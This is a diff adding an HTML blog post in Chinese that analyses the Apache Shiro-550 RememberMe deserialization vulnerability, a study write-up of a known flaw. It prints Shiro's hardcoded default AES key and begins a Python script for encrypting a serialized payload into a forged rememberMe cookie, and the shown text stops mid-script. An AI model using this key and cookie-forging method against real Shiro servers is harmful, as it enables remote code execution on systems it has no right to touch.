@@ -1,0 +1,1324 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Nbc">
+    
+    <title>
+        
+            Java安全Shiro篇 |
+        
+        Nbc&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/violet.jpg">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/font/css/brands.min.css">
+    
+        
+            
+        
+            
+                
+<link rel="stylesheet" href="/css/custom-1.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Nbc's Blog","author":"Nbc","avatar":"/images/violet.jpg","logo":"/images/violet.jpg","favicon":"/images/violet.jpg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","Links":"/links","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bh.jpg","background_img_dark":"/images/yl.jpg","description":"功利主义导向的思考方式往往使我们忘却了 || 生命的本质是一场历程","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/Nbccccc/","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":"nbcares@qq.com"}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"created_datetime_icon":"fa-solid fa-star"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2026,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":[null,"/css/custom-1.css"],"js":[null]},"root":"","source_data":{"links":[{"name":"ZIKH26","link":"https://zikh26.github.io","description":"神之学长 我的偶像","avatar":"https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg"}]},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/violet.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Nbc&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/links">
+                                
+                                友链
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/links">
+                            
+                            友链
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        Java安全Shiro篇
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/violet.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Nbc</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-star"></i>&nbsp;
+                <span class="datetime">2026-03-02 14:23:27</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon Mar 02 2026 15:36:00 GMT+0800">2026-03-02 15:36:00</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">基础学习</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>5.1k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>21 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="Java安全Shiro篇"><a href="#Java安全Shiro篇" class="headerlink" title="Java安全Shiro篇"></a>Java安全Shiro篇</h1><h2 id="了解Shiro"><a href="#了解Shiro" class="headerlink" title="了解Shiro"></a>了解Shiro</h2><h3 id="Shiro框架概述"><a href="#Shiro框架概述" class="headerlink" title="Shiro框架概述"></a>Shiro框架概述</h3><p>Apache Shiro是一个强大且易用的Java安全框架，提供了身份验证、授权、密码学和会话管理等功能。它被广泛用于保护各种类型的应用程序，包括Web应用、RESTful服务、移动应用和大型企业级应用。使用Shiro，你可以将安全性集成到应用程序中而不必担心复杂的实现细节。<br>Shiro的优势在于其简单性和灵活性。相较于其他安全框架，Shiro采用了非常直观的API和清晰的架构，使得开发者能够更轻松地理解和使用。此外，Shiro的可扩展性也是其强大之处，你可以根据自己的需求轻松地定制和扩展功能。</p>
+<h3 id="Shiro反序列化漏洞产生的原因"><a href="#Shiro反序列化漏洞产生的原因" class="headerlink" title="Shiro反序列化漏洞产生的原因"></a>Shiro反序列化漏洞产生的原因</h3><p>Shiro框架提供了记住我的功能（RememberMe）省去用户短时间内再次登录输入账号密码的操作，用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：检索RememberMe Cookie的值Base 64解码AES解密进行反序列化操作（未过滤处理）</p>
+<p>攻击者可以使用Shiro的密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令。</p>
+<p>PS：<a class="link"   target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86" >AES<i class="fas fa-external-link-alt"></i></a>是一种对称加密算法（加密和解密使用同一种密钥）</p>
+<blockquote>
+<p>加密过程：</p>
+<p>明文 –&gt; AES加密函数 + 密钥位数(128&#x2F;192&#x2F;256) + iv(初始化向量) + 密钥(key) + 模式(CBC和GCM等) + padding(填充方式)–&gt; 密文</p>
+</blockquote>
+<p>这样也就是说获得密钥就能随意构造Cookie的值，也就是说可以控制反序列化的过程</p>
+<h2 id="Shiro-550分析"><a href="#Shiro-550分析" class="headerlink" title="Shiro-550分析"></a>Shiro-550分析</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li>jdk8u65</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://tomcat.apache.org/download-80.cgi" >Tomcat8<i class="fas fa-external-link-alt"></i></a></li>
+<li>shiro 1.2.4</li>
+</ul>
+<p>参考这位师傅的<a class="link"   target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA" >Shiro550<i class="fas fa-external-link-alt"></i></a>环境搭建很详细</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>搭建完环境后，登录勾选Remember me 抓包观察</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727120242856.png"
+                        alt="image-20240727120242856"
+                 ></p>
+<blockquote>
+<p>勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe&#x3D;deleteMe 字段，还会有  rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段</p>
+</blockquote>
+<p>我们从一个漏洞发现者的角度分析，我们在抓某个页面的包时发现了这个Cookie长的不正常而且明显是感觉像Base</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727120537954.png"
+                        alt="image-20240727120537954"
+                 ></p>
+<p>到这里就可以感觉到是经过某种加密后的base64，会这样想的原因就是平常我们见到的cookie都不会这么长。</p>
+<p>Shiro1.2.4 及之前的版本中，AES 加密的密钥默认<strong>硬编码</strong>在代码里（[Shiro-550]([<a class="link"   target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-550" >SHIRO-550] Randomize default remember me cipher - ASF JIRA (apache.org)<i class="fas fa-external-link-alt"></i></a>)），Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。</p>
+<p>所以根据上面的叙述就有了这样一个思路：</p>
+<ol>
+<li>找到Shiro源码分析生成和处理Cookie的流程</li>
+<li>发现处理Cookie时有反序列化，并且知道了怎样生成的Cookie</li>
+<li>找到固定的key</li>
+<li>自己构造这个rememberMe从而控制反序列化的流程</li>
+<li>getshell</li>
+</ol>
+<h4 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h4><h5 id="加密Cookie过程"><a href="#加密Cookie过程" class="headerlink" title="加密Cookie过程"></a>加密Cookie过程</h5><p>打个断点看看过程</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727183949717.png"
+                        alt="image-20240727183949717"
+                 ></p>
+<p>首先判断是否勾选了rememberMe</p>
+<p>继续步入</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727184158572.png"
+                        alt="image-20240727184158572"
+                 ></p>
+<p>进行用户身份的保存</p>
+<p>步过继续步入<code>rememberIdentity</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727184354983.png"
+                        alt="image-20240727184354983"
+                 ></p>
+<p>步入</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727184421289.png"
+                        alt="image-20240727184421289"
+                 ></p>
+<p>可以看出是将用户信息序列化后进行加密</p>
+<p>看到<code>encrypt</code>明显是加密过程，步入看看是怎么个事</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727184541083.png"
+                        alt="image-20240727184541083"
+                 ></p>
+<p><code>CipherService</code> 明显是一个用于加密和解密操作的服务接口,<code>getEncryptionCipherKey()</code>是获取密钥key的</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727185519733.png"
+                        alt="image-20240727185519733"
+                 ></p>
+<p>可以看到AES加密，模式为CBC，128位，填充方式为PKCS5Padding</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727185827923.png"
+                        alt="image-20240727185827923"
+                 ></p>
+<p>可以看到获得的key，可以用脚本直接解出来</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(struct.pack(<span class="string">&#x27;&lt;bbbbbbbbbbbbbbbb&#x27;</span>, -<span class="number">112</span>, -<span class="number">15</span>, -<span class="number">2</span>, <span class="number">108</span>, -<span class="number">116</span>, <span class="number">100</span>, -<span class="number">28</span>, <span class="number">61</span>, -<span class="number">99</span>, <span class="number">121</span>, -<span class="number">104</span>, -<span class="number">120</span>, -<span class="number">59</span>, -<span class="number">58</span>, -<span class="number">102</span>, <span class="number">104</span>)))</span><br><span class="line"> <span class="comment"># struct.pack 是 Python 中用于将数据打包成二进制格式的函数。</span></span><br><span class="line">    <span class="comment"># 这里的 &#x27;&lt;bbbbbbbbbbbbbbbb&#x27; 是格式字符串，其中：</span></span><br><span class="line">    <span class="comment">#     &lt; 表示使用小端字节序（即低位字节在前）；</span></span><br><span class="line">    <span class="comment">#     b 表示将数据打包成一个有符号的字节（取值范围为 -128 到 127）。</span></span><br><span class="line">    <span class="comment"># 后面的一组整数（如 -112、-15 等）就是要打包的 16 个字节数据。</span></span><br><span class="line">    <span class="comment"># 打包后，它会生成一个二进制字节流。</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727190028321.png"
+                        alt="image-20240727190028321"
+                 ></p>
+<p>在Shiro中这个是直接写在源码里的我们可以找到</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727190758033.png"
+                        alt="image-20240727190758033"
+                 ></p>
+<p>想知道具体加密的过程还可以继续跟这里就知道是AES就先步出了</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727191124587.png"
+                        alt="image-20240727191124587"
+                 ></p>
+<p>回到<code>rememberIdentity</code>步入<code>rememberSerializedIdentity</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727192046349.png"
+                        alt="image-20240727192046349"
+                 ></p>
+<p>就是将序列化后加密的结果base64一下复制到Cookie的rememberMe字段中</p>
+<p>总结一下</p>
+<blockquote>
+<p><strong>加密过程为</strong>：</p>
+<p>设定：<strong>密钥</strong> &#x3D; kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p>
+<p>1.获得明文 &#x3D; 正常序列化用户名后的字节(root)</p>
+<p>2.以下步骤：</p>
+<ul>
+<li>科普知识：正常的AES加密所需参数 &#x3D; 想加密的字符串 + iv + key + CBC + padding</li>
+<li>shiro：AES加密 &#x3D; 想加密的字符串 (<code>明文</code>) + iv(<code>随机生成的长度为16的字节</code>) + key(<code>base64解码密钥的结果</code>) + CBC + PKCS5Padding</li>
+</ul>
+<p>3.随机生成的长度为16的字节 + AES加密结果 (就是拼接了一下)</p>
+<p>4.base64加密</p>
+</blockquote>
+<h5 id="处理Cookie过程"><a href="#处理Cookie过程" class="headerlink" title="处理Cookie过程"></a>处理Cookie过程</h5><p>直接全局搜索Cookie看看有什么</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727170016512.png"
+                        alt="image-20240727170016512"
+                 ></p>
+<p>很显眼的找到<code>CookieRememberMeManager</code>这个类，然后看一下里面的方法其中<code>getRememberedSerializedIdentity</code>这个方法里处理了Cookie</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727170404045.png"
+                        alt="image-20240727170404045"
+                 ></p>
+<p>先判断是否为 HTTP 请求，如果是的话，获取 cookie 中 rememberMe 的值，然后判断是否是 deleteMe，不是则判断是否是符合 base64 的编码长度，然后再对其进行 base64 解码，将解码结果返回。（deleteMe如其意很明显就是Cookie没有时候出现的字段比如登出、cookie无效、身份过期等情况）</p>
+<p>可以看到这个地方主要就是获取HTTP请求中的Cookie中rememberMe的值，继续找一下哪里调用这个方法。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727180252831.png"
+                        alt="image-20240727180252831"
+                 ></p>
+<p>找到了 <code>AbstractRememberMeManager</code> 这个接口的 <code>getRememberedPrincipals()</code> 方法。</p>
+<blockquote>
+<p><code>getRememberedPrincipals()</code> 方法的作用域为 <strong>PrincipalCollection</strong>，一般就是用于聚合多个 Realm 配置的集合。</p>
+</blockquote>
+<p>跟进<code>convertBytesToPrincipals</code>这个方法</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727181001373.png"
+                        alt="image-20240727181001373"
+                 ></p>
+<p>看看<code>decrypt()</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727193120958.png"
+                        alt="image-20240727193120958"
+                 ></p>
+<p>很像加密过程中的<code>encrypt()</code> </p>
+<p>getDecryptionCipherKey()还是获得密钥的过程是一样的</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727193318702.png"
+                        alt="image-20240727193318702"
+                 ></p>
+<p>对称加密所以key是一样的</p>
+<p>然后就是反序列化，这里面的 <code>deserial()</code> 方法调用了 <code>readObject()</code>，所以这里反序列化的地方是一个很好的入口类。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727193755059.png"
+                        alt="image-20240727193755059"
+                 ></p>
+<blockquote>
+<p><strong>那么解密过程为</strong>:</p>
+<p>设定：<strong>密钥</strong> &#x3D; kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p>
+<p>1.获得密文 &#x3D; base64解密rememberMe参数传过来的值</p>
+<p>2.以下步骤：</p>
+<ul>
+<li>科普知识：正常的AES解密所需参数 &#x3D; 想解密的字符串 + iv + key + CBC</li>
+<li>shiro：AES解密 &#x3D; 想解密的字符串(<code>删除密文前16个字节的剩余字节</code>)+iv(<code>密文的前16个字节</code>) + key(<code>base64解码**密钥**的结果</code>) + CBC + PKCS5Padding</li>
+</ul>
+</blockquote>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>PS：工具就不在这里面放了有很多</p>
+<p>既然 RCE，或者说弹 shell，是在反序列化的时候触发的。</p>
+<p>那我们的攻击就应该是将反序列化的东西，进行 shiro 的一系列加密操作，再把最后的那串东西替换包中的 RememberMe 字段的值。</p>
+<p>先是加密脚本(跟到加密那里mode是CBC key就是shirokey 加密后的内容前16位就是iv)</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data, key</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"><span class="comment">#去除填充</span></span><br><span class="line"><span class="comment"># def aes_dec(enc_data, key):</span></span><br><span class="line"><span class="comment">#     enc_data = base64.b64decode(enc_data)</span></span><br><span class="line"><span class="comment">#     unpad = lambda s: s[:-s[-1]]</span></span><br><span class="line"><span class="comment">#     mode = AES.MODE_CBC</span></span><br><span class="line"><span class="comment">#     iv = enc_data[:16]</span></span><br><span class="line"><span class="comment">#     encryptor = AES.new(base64.b64decode(key), mode, iv)</span></span><br><span class="line"><span class="comment">#     plaintext = encryptor.decrypt(enc_data[16:])</span></span><br><span class="line"><span class="comment">#     plaintext = unpad(plaintext)</span></span><br><span class="line"><span class="comment">#     return plaintext</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data, key</span>):</span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Encrypt or decrypt a file using AES.&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;operation&#x27;</span>, choices=[<span class="string">&#x27;en&#x27;</span>, <span class="string">&#x27;de&#x27;</span>], <span class="built_in">help</span>=<span class="string">&quot;Operation to perform: encrypt or decrypt&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--file&#x27;</span>,<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">help</span>=<span 